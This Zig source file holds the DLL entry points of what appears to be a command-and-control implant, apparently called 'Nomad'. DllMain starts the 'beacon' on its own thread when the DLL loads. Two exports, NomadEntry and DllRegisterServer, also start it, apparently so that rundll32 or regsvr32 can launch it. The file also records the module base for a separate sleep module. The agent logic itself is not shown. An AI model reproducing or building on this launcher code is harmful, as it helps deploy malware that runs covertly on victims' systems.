const std = @import("std");
const windows = std.os.windows;
const build_options = @import("build_options");
const agent = @import("agent.zig");
const win = @import("win32.zig");
const sleep = @import("sleep.zig");

var nx_started = std.atomic.Value(bool).init(false);

fn nx_start_once() void {
    if (nx_started.swap(true, .acq_rel)) return;
    agent.nx_start();
}

fn nx_start_thread(_: ?*anyopaque) callconv(.winapi) windows.DWORD {
    nx_start_once();
    return 0;
}

pub export fn DllMain(
    module: ?windows.HINSTANCE,
    reason: windows.DWORD,
    reserved: ?*anyopaque,
) callconv(.winapi) windows.BOOL {
    _ = reserved;
    const DLL_PROCESS_ATTACH: windows.DWORD = 1;
    if (reason == DLL_PROCESS_ATTACH) sleep.nx_module_base = if (module) |m| @ptrCast(m) else null;
    if (reason == DLL_PROCESS_ATTACH and build_options.dllmain_start) {
        // DllMain runs under the loader lock; return immediately and let the
        // beacon run on its own thread.
        if (win.CreateThread(null, 0, nx_start_thread, null, 0, null)) |thread| {
            _ = win.CloseHandle(thread);
        } else {
            nx_start_once();
        }
    }
    return windows.BOOL.TRUE;
}

pub export fn NomadEntry(
    hwnd: ?*anyopaque,
    hinst: ?*anyopaque,
    command_line: ?[*:0]u8,
    show: c_int,
) callconv(.winapi) void {
    _ = hwnd;
    _ = hinst;
    _ = command_line;
    _ = show;
    nx_start_once();
}

pub export fn DllRegisterServer() callconv(.winapi) i32 {
    nx_start_once();
    return 0;
}

pub export fn DllUnregisterServer() callconv(.winapi) i32 {
    return 0;
}
